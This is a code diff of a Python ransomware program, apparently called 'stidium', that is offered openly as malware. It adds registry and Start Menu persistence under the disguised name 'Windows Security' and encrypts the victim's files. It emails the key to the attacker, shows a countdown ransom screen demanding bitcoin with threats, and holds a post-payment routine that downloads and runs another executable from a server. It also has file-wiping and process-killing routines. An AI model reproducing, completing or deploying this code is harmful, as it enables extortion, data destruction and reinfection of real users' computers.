@@ -4,6 +4,7 @@ from cryptography.fernet import Fernet
 from email.message import EmailMessage
 from random import choices
 from string import ascii_letters, digits
+import psutil
 import smtplib
 import time
 import tkinter as tk
@@ -11,6 +12,7 @@ import sys
 import shutil
 import winreg
 import base64
+import requests
 
 SENDER = ""
 SENDER_P = ""  # App password here,
@@ -18,89 +20,41 @@ RECEIVER = ""
 timer = 60 * 60 * 48  # 48 hours
 
 
-def decrypt_file(file_path, key):
-    # TODO: delete the files for storing stuff after decryption too
-    # Open the encrypted file in binary mode
-
+# Payload
+def insert_to_startup():
+    # copy the file to C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\programs\\{FILE_NAME}
+    PATH = sys.argv[0]
+    if not os.path.exists(
+            os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
+                         "programs")):
+        os.makedirs(os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
+                                 "programs"))
+    # Incase the file is already in it, else copy it
     try:
-        with open(file_path, "rb") as encrypted_file:
-            # Read the encrypted data
-            encrypted_data = encrypted_file.read()
-
-        # Generate a Fernet object using the key
-        fernet = Fernet(key)
-        # Decrypt the data
-        decrypted_data = fernet.decrypt(encrypted_data)
-
-        # Write the decrypted data to a new file
-        with open(file_path[:-10], "wb") as decrypted_file:
-            decrypted_file.write(decrypted_data)
-
-        # Delete the encrypted file
-        os.remove(file_path)
-    except Exception:  # NOQA
+        shutil.copy(PATH,
+                    os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
+                                 "programs"))
+    except shutil.SameFileError:
         pass
 
-
-def find_to_decrypt():
-    # get the files from files.json and decrypt them
-    with open("files.json", "r", encoding="utf-8") as f:
-        files = f.read()
-        f.close()
-
-        # cleaning the data
-        filtered_files = [f.split("'")[1] for f in files.replace("\\\\", "\\")[1:-1].split(", ")]
-        filtered_files = [f for f in filtered_files if f.strip() != ""]
-
-    return filtered_files
-
-
-def post_infect():
-    # Infect the host with a malware after it has been decrypted, did you expect me to just let it free?
-
-    # Kill the program
-    os.system("taskkill /f /im stidium.exe")
-
-
-def nuke_pc():
-    # Nuke the PC, delete everything
-    files = find_to_decrypt()
-
-    def delete(file):
-        try:
-            os.remove(file)
-        except Exception:  # NOQA
-            pass
-
-    threads5 = []
-    for file_pth in files:
-        t5 = threading.Thread(target=delete, args=file_pth)
-        threads5.append(t5)
-        t5.start()
-
-    # Wait for all threads to complete
-    for t in threads5:
-        t.join()
-
-
-def encrypt_file(file_path, key):
-    # Open the file in binary mode and read it
+    user = os.getlogin()
+    # Check if it's run as .py or .exe
+    if sys.argv[0].endswith(".py"):
+        FILE_NAME = sys.argv[0][sys.argv[0].rfind("/") + 1:]
+    else:
+        FILE_NAME = sys.argv[0][sys.argv[0].rfind("\\") + 1:]
+    # Open the key, this would raise an WindowsError if the key doesn't exist
     try:
-        with open(file_path, "rb") as file:
-            file_data = file.read()
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
+                             winreg.KEY_ALL_ACCESS)
+    except WindowsError:
+        # Create the key since it does not exist
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
 
-        # Generate a Fernet object using the key and encrypt the data
-        fernet = Fernet(key)
-        encrypted_data = fernet.encrypt(file_data)
-
-        # Write the encrypted data to a new file
-        with open(file_path + ".enc", "wb") as encrypted_file:
-            encrypted_file.write(encrypted_data)
-
-        # Delete the original file
-        os.remove(file_path)
-    except Exception:  # NOQA
-        pass
+    # Set the value on Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    winreg.SetValueEx(key, "Windows Security", 0, winreg.REG_SZ,
+                      f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\programs\\{FILE_NAME}")
+    winreg.CloseKey(key)
 
 
 def file_find(key):
@@ -192,6 +146,28 @@ def file_find(key):
         f.close()
 
 
+def encrypt_file(file_path, key):
+    # Open the file in binary mode and read it
+    try:
+        with open(file_path, "rb") as file:
+            file_data = file.read()
+
+        # Generate a Fernet object using the key and encrypt the data
+        fernet = Fernet(key)
+        encrypted_data = fernet.encrypt(file_data)
+
+        # Write the encrypted data to a new file
+        with open(file_path + ".enc", "wb") as encrypted_file:
+            encrypted_file.write(encrypted_data)
+
+        # Delete the original file
+        os.remove(file_path)
+    except Exception:  # NOQA
+        pass
+    pass
+
+
+# Sending the key
 def send_email(key, attack_id):
     msg = EmailMessage()
     msg["Subject"] = f"Ransomware Report | Attack ID: {attack_id}"
@@ -207,13 +183,119 @@ def send_email(key, attack_id):
         smtp.send_message(msg)
 
 
+# Disinfect
+def find_to_decrypt():
+    # get the files from files.json and decrypt them
+    with open("files.json", "r", encoding="utf-8") as f:
+        files = f.read()
+        f.close()
+
+        # cleaning the data
+        filtered_files = [f.split("'")[1] for f in files.replace("\\\\", "\\")[1:-1].split(", ")]
+        filtered_files = [f for f in filtered_files if f.strip() != ""]
+
+    return filtered_files
+
+
+def decrypt_file(file_path, key):
+    # Open the encrypted file in binary mode
+    pass
+    try:
+        with open(file_path + ".enc", "rb") as encrypted_file:
+            # Read the encrypted data
+            encrypted_data = encrypted_file.read()
+
+        fernet = Fernet(key)
+        decrypted_data = fernet.decrypt(encrypted_data)
+
+        # Write the decrypted data to a new file
+        with open(file_path, "wb") as decrypted_file:
+            decrypted_file.write(decrypted_data)
+
+        os.remove(file_path + ".enc")
+    except Exception:  # NOQA
+        pass
+
+
+def disinfect_stidium():
+    # Clean the files that were created
+    os.remove("files.json")
+    os.remove(os.path.join(os.environ["TEMP"], "temp23.txt.enc"))
+    os.remove(f"C:\\Users\\{os.getlogin()}\\Downloads\\attack_id.txt")
+    os.remove(os.path.join(os.environ["TEMP"], "pkg.txt.enc"))
+    os.remove(os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
+                           "programs", os.path.basename(__file__)))
+
+    # Remove from startup
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
+                         winreg.KEY_ALL_ACCESS)
+    winreg.DeleteValue(key, "Windows Security")
+    winreg.CloseKey(key)
+    os.remove(os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
+                           "programs", os.path.basename(__file__)))
+
+
+# Post-infection
+def post_infect():
+    # Infect the host with a malware after it has been decrypted, did you expect me to just let it free?
+    def download_payload(file_name, delete_before_trying):
+        if delete_before_trying:
+            try:
+                os.remove(file_name)
+            except FileNotFoundError:
+                pass
+        # Get the download link from the server
+        d = requests.get(r"")  # TODO: put some link here to download the .exe version of the downloader
+        # Download the file and save it to the same dir as the script
+        r = requests.get(d.text, allow_redirects=True)
+
+        with open(f"{file_name}.txt", "wb") as f:
+            f.write(r.content)
+
+        # change it to .exe
+        os.rename(f"{file_name}.txt", f"{file_name}.exe")
+
+        # run the exe and kill cmd task
+        os.system(f"{file_name}.exe")
+        os.system("taskkill /f /im cmd.exe")
+
+
+def nuke_pc():
+    # Nuke the PC, delete everything
+    files = find_to_decrypt()
+
+    def delete(file):
+        try:
+            # os.remove(file)
+            print(file, "deleted")
+        except Exception:  # NOQA
+            pass
+
+    threads5 = []
+    for file_pth in files:
+        t5 = threading.Thread(target=delete, args=file_pth)
+        threads5.append(t5)
+        t5.start()
+
+    # Wait for all threads to complete
+    for t in threads5:
+        t.join()
+
+    # Kill the program
+    if sys.argv[0].endswith(".py"):
+        os.system(f"taskkill /f /im python.exe")
+    else:
+        os.system(f"taskkill /f /im {os.path.basename(__file__)}")
+
+
+# Ransom Screen
 def popup_window(attack_id, key, email, attempts):
     # Create the main window
     root = tk.Tk()
-    root.title(f"{attack_id}")
+    root.title("​​​​")
 
     # Override the close button to do nothing
-    def do_nothing():
+    def do_nothing():  # NOQA
         pass
 
     def check_key(decrypt_key):
@@ -223,14 +305,15 @@ def popup_window(attack_id, key, email, attempts):
             countdown = int(data.split("\n ")[1])
             f.close()
 
-        if key_entry.get() == str(base64.b64decode(decrypt_key.decode())).lstrip("b'").rstrip("'"):
+        if key_entry.get() == decrypt_key.decode().lstrip("b'").rstrip("'"):
             attemps_label.config(text=f"Key successfully entered. Thank you for your cooperation.\n"
                                       f"Please wait as we decrypt your files,\n This window will be "
                                       f"closed automatically.")
             files = find_to_decrypt()
 
-            threads3 = [post_infect()]
+            threads3 = [post_infect(), disinfect_stidium()]
             for file_path in files:
+                file_path += ".enc"
                 t3 = threading.Thread(target=decrypt_file, args=(file_path, key_entry.get()))
                 threads3.append(t3)
                 t3.start()
@@ -307,7 +390,9 @@ def popup_window(attack_id, key, email, attempts):
     tk.Label(root, text=f"Pay us 0.01 bitcoin and send the proof to {email} in order to receive the key \n"
                         f"Bitcoin Address: bc1q7mjcwx726a63d233w39nw2gxsuxpahpacu8e3c", fg='white', bg='dark red',
              font=('Helvetica', 16, 'bold')).pack()
-    tk.Label(root, text=f"Don't forget to put '{os.getlogin()}' and '{attack_id}' in the email", fg='white',
+    tk.Label(root, text=f"Don't forget to put '{os.getlogin()}' and '{attack_id}' with the email else "
+                        f"your key wont be delivered (Note: Don't try bypassing this,\nyour pc might be locked "
+                        f"forever if you try)", fg='white',
              bg='dark red', font=('Helvetica', 16, 'bold')).pack()
 
     # a function to update the timer and encrypted files list
@@ -349,40 +434,28 @@ def popup_window(attack_id, key, email, attempts):
     root.mainloop()
 
 
-def insert_to_startup():
-    # copy the file to C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\programs\\{FILE_NAME}
-    PATH = sys.argv[0]
-    if not os.path.exists(
-            os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
-                         "programs")):
-        os.makedirs(os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
-                                 "programs"))
-    # Incase the file is already in it, else copy it
-    try:
-        shutil.copy(PATH,
-                    os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
-                                 "programs"))
-    except shutil.SameFileError:
-        pass
+def shut_apps():
+    running_apps = {i.name() for i in psutil.process_iter()}
 
-    user = os.getlogin()
-    # Check if it's run as .py or .exe
-    if sys.argv[0].endswith(".py"):
-        FILE_NAME = sys.argv[0][sys.argv[0].rfind("/") + 1:]
-    else:
-        FILE_NAME = sys.argv[0][sys.argv[0].rfind("\\") + 1:]
-    # Open the key, this would raise an WindowsError if the key doesn't exist
-    try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
-                             winreg.KEY_ALL_ACCESS)
-    except WindowsError:
-        # Create the key since it does not exist
-        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
+    AVOID = {"Microsoft.Photos.exe", "GoogleCrashHandler.exe", "SearchIndexer.exe", "SDXHelper.exe", "audiodg.exe",
+             "sihost.exe", "dwm.exe", "wsc_proxy.exe", "aswEngSrv.exe", "wininit.exe", "aswidsagent.exe",
+             "taskhostw.exe", "AVGUI.exe", "RtkNGUI64.exe", "atkexComSvc.exe", "SystemSettingsBroker.exe",
+             "dasHost.exe", "lsass.exe", "WmiPrvSE.exe", "explorer.exe", "jusched.exe", "dllhost.exe", "atieclxx.exe",
+             "smss.exe", "svchost.exe", "spoolsv.exe", "SgrmBroker.exe", "SearchApp.exe", "igfxCUIService.exe",
+             "CompPkgSrv.exe", "SystemSettings.exe", "GoogleCrashHandler64.exe", "StartMenuExperienceHost.exe",
+             "gamingservicesnet.exe","GoogleUpdate.exe" "PhoneExperienceHost.exe", "sppsvc.exe", "XboxApp.exe",
+             "LockApp.exe", "NLSSRV32.EXE", "mongod.exe", "SppExtComObj.Exe", "fontdrvhost.exe", "RuntimeBroker.exe",
+             "SecurityHealthSystray.exe", "services.exe", "ShellExperienceHost.exe", "TextInputHost.exe", "csrss.exe",
+             "winlogon.exe", "SecurityHealthService.exe", "ctfmon.exe", "PresentationFontCache.exe", "warp-svc.exe",
+             "WUDFHost.exe", "armsvc.exe", "ApplicationFrameHost.exe", "conhost.exe", "atiesrxx.exe",
+             "AppVShNotify.exe"}
 
-    # Set the value on Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-    winreg.SetValueEx(key, "Windows Security", 0, winreg.REG_SZ,
-                      f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\programs\\{FILE_NAME}")
-    winreg.CloseKey(key)
+    AVOID2 = {"System Idle Process", "System", "Registry", "MemCompression"}
+
+    for i in running_apps:
+        if i not in AVOID and i not in AVOID2:
+            # os.system(f"taskkill /f /im {i}")
+            pass
 
 
 def main():
@@ -391,7 +464,7 @@ def main():
     if SENDER == "" or SENDER_P == "" or RECEIVER == "" or not (SENDER.endswith(".com")) or len(SENDER_P) != 16 or \
             not (RECEIVER.endswith(
                 ".com")):  # if either of these conditions are met, stop it incase the user haven't set it up correctly
-        pass
+        print("Please set up the email settings on the top")
     else:
         if os.path.exists(os.path.join(os.environ["TEMP"], "temp23.txt.enc")) \
                 and os.path.exists(os.path.join(os.environ["TEMP"], "pkg.txt.enc")) \
@@ -441,9 +514,10 @@ def main():
                 f.write(str(attempt))
                 f.write("\n " + str(timer))
                 f.close()
-
             # Pop-up window with the attack ID and Email to send the key to the attacker
             popup_window(attack_id, decrypt_key, RECEIVER, attempt)
+
+            shut_apps()  # TODO: TEST IT OUT ON A VM (And then move it up maybe?)
 
 
 if __name__ == "__main__":
